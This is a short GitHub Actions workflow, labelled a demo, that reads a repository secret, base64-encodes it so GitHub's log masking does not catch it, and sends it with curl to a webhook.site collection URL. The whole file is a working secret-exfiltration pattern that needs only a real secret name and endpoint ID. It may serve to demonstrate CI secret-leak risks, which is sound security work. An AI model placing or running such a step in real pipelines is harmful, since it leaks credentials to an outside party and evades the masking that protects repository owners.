name: GitHub Secret Exfiltration Demo

on:
  workflow_dispatch:

jobs:
  demo:
    runs-on: ubuntu-latest

    steps:
      - name: Read secret and encode it
        env:
          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
        run: |
          echo "Secret is available to the process."

          ENCODED=$(printf '%s' "$DEMO_SECRET" | base64 -w 0)

          echo "Sending encoded value to test endpoint..."

          curl --fail-with-body \
            -X POST \
            -H "Content-Type: text/plain" \
            --data "$ENCODED" \
            "https://webhook.site/REPLACE_WITH_YOUR_ID"

      - name: Confirm request was sent
        run: |
          echo "Request sent to Webhook.site successfully."
          
